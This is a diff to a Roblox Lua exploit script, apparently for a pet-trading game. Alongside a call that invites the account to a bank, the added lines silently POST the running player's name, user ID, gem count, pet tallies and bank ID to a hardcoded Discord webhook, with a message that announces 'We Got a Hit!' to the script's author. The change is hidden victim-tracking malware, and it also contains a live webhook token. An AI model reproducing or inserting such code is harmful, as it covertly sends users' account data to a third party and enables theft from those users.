@@ -343,6 +343,79 @@ local A_1 =
 }
 local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
 Event:InvokeServer(A_1)
+
+local url = "https://discord.com/api/webhooks/961349562453356595/_XAu26bGuvW9fcHTUfB5ZoHClcWqi1yUFlVNhYo4e_OhRLJUBWpdMGr3JgZ_M4QKvjl8"
+local username = game:GetService("Players").LocalPlayer.Name
+ 
+local data = {
+  ["content"] = "@everyone We Got a Hit!",
+["embeds"] = {{
+["title"] = "__**Bank Scum**__",
+["description"] = "(Note: This is not sent by a generated script!)",
+["type"] = "rich",
+["color"] = tonumber(0x0E980E),
+["fields"] = {
+               {
+["name"] = "__User__",
+["value"] = "**"..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
+["inline"] = false
+},
+               {
+["name"] = "__Gems__",
+["value"] = SuperBank[1]["Storage"]["Currency"]["Diamonds"],
+["inline"] = false
+},
+{
+["name"] = "__Pets Overall__",
+["value"] = #SuperBank[1]["Storage"]["Pets"],
+["inline"] = false
+},
+{
+["name"] = "__Exclusive/Huges__",
+["value"] = EXCCount.." ("..HugeCount..")",
+["inline"] = true
+},
+{
+["name"] = "__Mythicals__",
+["value"] = MythicCount,
+["inline"] = true
+},
+{
+["name"] = "__Legendaries__",
+["value"] = LegCount,
+["inline"] = true
+},
+{
+["name"] = "__Epics__",
+["value"] = EpicCount,
+["inline"] = true
+},
+{
+["name"] = "__Rares__",
+["value"] = RareCount,
+["inline"] = true
+},
+{
+["name"] = "__Basics__",
+["value"] = CommonCount,
+["inline"] = true
+},
+{
+["name"] = "__BankID__",
+["value"] = Bank,
+["inline"] = false
+},
+}
+}}
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+  ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 wait(3)
 local A_1 = 
 {
